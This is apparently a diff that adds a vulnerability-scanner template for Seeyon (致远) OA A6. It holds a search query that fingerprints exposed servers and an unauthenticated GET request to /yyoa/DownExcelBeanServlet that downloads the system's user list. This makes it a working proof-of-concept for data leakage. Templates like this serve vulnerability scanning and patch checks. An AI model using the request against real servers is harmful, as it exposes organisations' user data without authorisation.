@@ -1,0 +1,24 @@
+name: 致远OA A6 用户敏感信息泄露
+manual: true
+query: (app="致远互联-OA" || app="Seeyon-Server"|| app="用友-致远OA" || (server="Seeyon-Server")
+  || (body="/seeyon/USER-DATA/IMAGES/LOGIN/login.gif" || title="用友致远A" || body="/yyoa/"
+  || header="path=/yyoa" || server=="SY8044" || (body="A6-V5企业版" && body="seeyon"
+  && body="seeyonProductId") || (body="/seeyon/common/" && body="var _ctxpath = '/seeyon'")
+  || (body="A8-V5企业版" && body="/seeyon/"))
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"@")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: |-
+    致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息
+    http://xxx.xxx.xxx.xxx/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+  tags: 信息泄露
